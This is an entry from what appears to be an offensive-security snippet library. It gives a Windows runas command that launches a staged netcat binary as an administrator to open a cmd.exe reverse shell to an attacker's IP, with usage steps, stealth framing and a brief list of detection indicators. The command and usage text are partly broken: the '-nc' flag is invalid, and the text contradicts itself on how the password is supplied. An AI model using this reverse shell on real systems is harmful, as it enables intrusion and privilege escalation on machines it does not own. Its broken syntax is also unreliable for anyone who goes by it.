---
id: 96823a7a-a970-4b79-b913-2261158b1ef6
name: runas-launch-nc-reverse-shell
type: code
language: cmd
verified: true
created_at: '2023-04-06T03:56:29.950025+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - reverse-shell
  - privilege-escalation
  - netcat
validated: true
---

# runas-launch-nc-reverse-shell

## Code

```cmd
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

## Description

This snippet invokes `runas.exe` directly to execute `nc.exe` (netcat) as a privileged user, establishing a reverse shell to the attacker's listener. It bypasses profile loading for stealth and uses inline password for one-time escalation.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| <username> | Privileged username | Administrator |
| <password> | Password for the user | Pass123 |
| <attacker-ip> | Attacker's IP for callback | 192.168.1.100 |

## Usage

Stage `nc.exe` in a public directory on the target. Run from low-priv shell; it prompts inline for password and launches the shell as admin. Listener (e.g., `nc -lvnp 4444`) receives the connection. Ideal for quick escalation post-credential acquisition.

## Detection

- EDR alerts on `runas.exe` with command-line args containing IPs or `-e cmd.exe`.
- Network outbound to high ports (e.g., 4444) from `nc.exe` child of `runas`.
- Sysmon Event ID 1 filtering for `nc.exe` executions.
- Inline password usage may trigger credential exposure logs if auditing enabled.

## Related

- [[procedures/windows-privilege-escalation-via-runas]]
- [[tools/Netcat]]
